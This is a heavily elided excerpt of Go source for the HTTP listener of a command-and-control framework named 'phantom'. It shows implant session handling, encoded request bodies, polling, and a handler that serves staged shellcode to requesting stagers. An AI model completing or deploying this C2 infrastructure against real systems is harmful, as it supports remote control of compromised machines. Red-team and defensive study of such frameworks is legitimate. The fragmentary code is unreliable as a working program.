...
import (
	...
	phantomHandlers "github.com/cryptdefender3232/phantom/server/handlers"
	"github.com/cryptdefender3232/phantom/server/log"
	"github.com/cryptdefender3232/phantom/server/website"
	"github.com/cryptdefender3232/phantom/util"
	phantomEncoders "github.com/cryptdefender3232/phantom/util/encoders"
...
// HTTPSession - Holds data related to a phantom c2 session
...
// PhantomHTTPC2 - Holds refs to all the C2 objects
type PhantomHTTPC2 struct {
...
func (s *PhantomHTTPC2) getServerHeader() string {
...
func (s *PhantomHTTPC2) getCookieName(c2ConfigName string) string {
...
func StartHTTPListener(req *clientpb.HTTPListenerReq) (*PhantomHTTPC2, error) {
	httpLog.Infof("Starting https listener on '%s'", req.Host)
	server := &PhantomHTTPC2{
		ServerConf: req,
		HTTPSessions: &HTTPSessions{
			active: map[string]*HTTPSession{},
			mutex:  &sync.RWMutex{},
...
func (s *PhantomHTTPC2) loadServerHTTPC2Configs() *clientpb.HTTPC2Configs {
...
func (s *PhantomHTTPC2) router() *mux.Router {
...
func (s *PhantomHTTPC2) noCacheHeader(resp http.ResponseWriter) {
...
func getEncoder(reqURL *url.URL, c2config *clientpb.HTTPC2Config) (phantomEncoders.Encoder, error) {
	var (
		err    error
		nonces []uint64
	)
...
func (s *PhantomHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		var (
...
func (s *PhantomHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) error {
...
func (s *PhantomHTTPC2) defaultHandler(resp http.ResponseWriter, req *http.Request) {
...
// [ HTTP Handlers ] ---------------------------------------------------------------
func (s *PhantomHTTPC2) mainHandler(resp http.ResponseWriter, req *http.Request) {
...
func (s *PhantomHTTPC2) authenticatedHandler(resp http.ResponseWriter, req *http.Request, session *HTTPSession) {
...
func (s *PhantomHTTPC2) anonymousHandler(resp http.ResponseWriter, req *http.Request) {
...
func (s *PhantomHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request, encoder phantomEncoders.Encoder) {
	...
	sessionInit := &phantompb.HTTPSessionInit{}
...
func (s *PhantomHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request, httpSession *HTTPSession, c2profile *clientpb.HTTPC2Config, encoder phantomEncoders.Encoder) {
	...
	handlers := phantomHandlers.GetHandlers()
	if envelope.ID != 0 {
...
func (s *PhantomHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request, httpSession *HTTPSession, encoder phantomEncoders.Encoder) {
...
func (s *PhantomHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseWriter, req *http.Request, c2profile *clientpb.HTTPC2Config, encoder phantomEncoders.Encoder) ([]byte, error) {
...
func decodeReqBodyWithMaxLen(encoder phantomEncoders.Encoder, body []byte, maxDecodedLen int64) ([]byte, error) {
	if limitedDecoder, ok := encoder.(phantomEncoders.LimitedDecoder); ok {
		return limitedDecoder.DecodeWithMaxLen(body, maxDecodedLen)
	}
	return encoder.Decode(body)
}

func (s *PhantomHTTPC2) getServerPollTimeout() time.Duration {
...
func (s *PhantomHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request, httpSession *HTTPSession) {
...
// stagerHandler - Serves the phantom shellcode to the stager requesting it
func (s *PhantomHTTPC2) stagerHandler(resp http.ResponseWriter, req *http.Request) {
	...
	for _, nonce := range nonces {
		...
		if err == nil {
			...
			if build.Stage {
				...
				s.noCacheHeader(resp)
				resp.Write(payload)
				httpLog.Infof("Serving phantom shellcode (size %d) %s to %s", len(payload), resourceID.Name, getRemoteAddr(req))
				resp.WriteHeader(http.StatusOK)
			}
		}
	}
...
func (s *PhantomHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
